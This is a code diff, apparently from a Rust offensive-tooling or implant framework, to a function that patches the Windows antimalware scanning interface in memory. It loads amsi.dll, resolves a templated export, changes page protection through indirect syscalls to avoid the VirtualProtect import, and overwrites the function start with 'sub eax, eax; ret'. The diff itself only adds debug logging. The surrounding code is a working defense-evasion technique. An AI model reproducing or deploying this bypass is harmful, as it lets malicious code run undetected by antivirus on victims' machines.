@@ -31,9 +31,12 @@ pub enum PatchAmsiError {
 /// syscall layer's `nt_protect_vm`, so `mode: indirect` removes the
 /// `VirtualProtect` import.
 pub fn patch_amsi() -> Result<bool, PatchAmsiError> {
-    let amsi_dll = std::ffi::CString::new($AMSI_DLL_DEF$).map_err(|_| PatchAmsiError::LoadFailed)?;
-    let func_name =
-        std::ffi::CString::new($AMSI_FUNC_DEF$).map_err(|_| PatchAmsiError::LoadFailed)?;
+    let dll_name: String = $AMSI_DLL_DEF$;
+    let export_name: String = $AMSI_FUNC_DEF$;
+    crate::tech_dbg!("patch_amsi", "patching {dll_name}!{export_name}");
+
+    let amsi_dll = std::ffi::CString::new(dll_name).map_err(|_| PatchAmsiError::LoadFailed)?;
+    let func_name = std::ffi::CString::new(export_name).map_err(|_| PatchAmsiError::LoadFailed)?;
 
     // 1. Load amsi.dll (a no-op if it is already loaded).
     let module = unsafe { LoadLibraryA(PCSTR(amsi_dll.as_ptr() as *const u8)) }
@@ -43,6 +46,7 @@ pub fn patch_amsi() -> Result<bool, PatchAmsiError> {
     let address = unsafe { GetProcAddress(module, PCSTR(func_name.as_ptr() as *const u8)) };
     let address = address.ok_or(PatchAmsiError::ResolveFailed)?;
     let target = address as usize as *mut u8;
+    crate::tech_dbg!("patch_amsi", "resolved target at {target:p}");
 
     // 3. Make the first three bytes writable.
     let mut old_protect = 0u32;
@@ -75,6 +79,10 @@ pub fn patch_amsi() -> Result<bool, PatchAmsiError> {
     if status < 0 {
         return Err(PatchAmsiError::RestoreProtectionFailed);
     }
+    crate::tech_dbg!(
+        "patch_amsi",
+        "wrote sub eax, eax; ret and restored the original protection"
+    );
 
     // A Preparation always continues the pipeline; only the `bouncer` gate
     // decides to abort (see `techniques/README.md`).
